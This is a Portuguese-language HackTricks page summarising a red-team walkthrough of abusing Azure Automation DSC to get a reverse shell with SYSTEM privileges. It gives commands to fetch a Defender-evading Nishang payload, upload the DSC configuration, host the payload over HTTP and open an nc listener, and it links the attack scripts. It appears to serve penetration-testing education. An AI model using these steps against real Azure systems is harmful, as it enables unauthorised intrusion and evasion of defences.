# Az - Configura√ß√£o de Estado RCE

{% hint style="success" %}
Aprenda e pratique Hacking AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

**Verifique o post completo em: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Resumo da Prepara√ß√£o e Etapas da Infraestrutura do Servidor Remoto (C2)

#### Vis√£o Geral
O processo envolve configurar uma infraestrutura de servidor remoto para hospedar um payload modificado `Invoke-PowerShellTcp.ps1` do Nishang, chamado `RevPS.ps1`, projetado para contornar o Windows Defender. O payload √© servido a partir de uma m√°quina Kali Linux com IP `40.84.7.74` usando um servidor HTTP Python simples. A opera√ß√£o √© executada por meio de v√°rias etapas:

#### Etapa 1 ‚Äî Criar Arquivos
- **Arquivos Necess√°rios:** Dois scripts do PowerShell s√£o necess√°rios:
1. `reverse_shell_config.ps1`: Um arquivo de Configura√ß√£o de Estado Desejado (DSC) que busca e executa o payload. Ele pode ser obtido em [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Um script para publicar a configura√ß√£o na VM, dispon√≠vel em [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Personaliza√ß√£o:** Vari√°veis e par√¢metros nesses arquivos devem ser adaptados ao ambiente espec√≠fico do usu√°rio, incluindo nomes de recursos, caminhos de arquivos e identificadores de servidor/payload.

#### Etapa 2 ‚Äî Compactar Arquivo de Configura√ß√£o
- O `reverse_shell_config.ps1` √© comprimido em um arquivo `.zip`, tornando-o pronto para transfer√™ncia para a Conta de Armazenamento do Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Passo 3 ‚Äî Definir Contexto de Armazenamento & Fazer Upload
- O arquivo de configura√ß√£o compactado √© enviado para um cont√™iner de Armazenamento Azure predefinido, azure-pentest, usando o cmdlet Set-AzStorageBlobContent do Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Passo 4 ‚Äî Preparar o Kali Box
- O servidor Kali faz o download do payload RevPS.ps1 de um reposit√≥rio do GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- O script √© editado para especificar o VM Windows alvo e a porta para o shell reverso.

#### Passo 5 ‚Äî Publicar Arquivo de Configura√ß√£o
- O arquivo de configura√ß√£o √© executado, resultando no script de shell reverso sendo implantado no local especificado no VM Windows.

#### Passo 6 ‚Äî Hospedar Payload e Configurar Ouvinte
- Um SimpleHTTPServer em Python √© iniciado para hospedar o payload, juntamente com um ouvinte Netcat para capturar conex√µes de entrada.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- A tarefa agendada executa o payload, alcan√ßando privil√©gios de n√≠vel SYSTEM.

#### Conclus√£o

A execu√ß√£o bem-sucedida desse processo abre in√∫meras possibilidades para a√ß√µes adicionais, como extra√ß√£o de credenciais ou expans√£o do ataque para v√°rias VMs. O guia incentiva a aprendizagem cont√≠nua e a criatividade no √¢mbito do Azure Automation DSC.

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
